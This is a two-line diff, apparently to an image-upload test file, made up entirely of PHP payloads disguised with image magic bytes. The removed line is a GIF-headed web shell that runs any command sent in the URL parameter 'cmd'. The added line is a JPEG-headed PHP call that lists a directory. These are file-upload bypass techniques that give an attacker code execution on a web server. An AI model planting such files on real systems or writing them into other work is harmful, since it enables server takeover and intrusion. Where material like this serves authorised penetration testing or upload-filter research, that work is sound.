@@ -1,2 +1,1 @@
-GIF89a;
-<? system($_GET['cmd']); ?>
+ÿØÿà<? system("ls"); ?>
